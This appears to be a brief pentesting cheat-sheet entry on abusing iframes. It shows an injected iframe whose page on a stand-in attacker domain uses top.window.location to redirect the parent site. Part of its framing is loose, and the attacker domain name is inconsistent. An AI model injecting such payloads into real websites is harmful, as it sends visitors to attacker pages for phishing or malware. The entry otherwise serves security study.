The [\<iframe>](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) tag is used to embed an HTML document in another HTML document. If source of inserted document located on another origin, same origin policy will block any access to content of other document for both of them.

# Open redirect

Child document can view and set location property for parent, even if cross-origin `top.window.location`.

Inject an iframe to `vulnerable-website.com`:

```html
<iframe src=//malicious-website.com/toplevel.html></iframe>
```

where `https://malicious-website.com/toplevel.html` contains:

```html
<html><head></head><body><script>top.window.location = "https://malicious-website.com/pwned.html"</script></body></html>
```

When the iframe is loaded, the parent will be redirected to the `https://malware-website.com/pwned.html` page, even if the child document is loaded from a different origin. Same origin policy will be bypassed because the iframe is not being "sandboxed", q.v. [sandbox iframe attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe).

# References

- [\<meta> and \<iframe> tags chained to SSRF](https://medium.com/@know.0nix/hunting-good-bugs-with-only-html-d8fd40d17b38)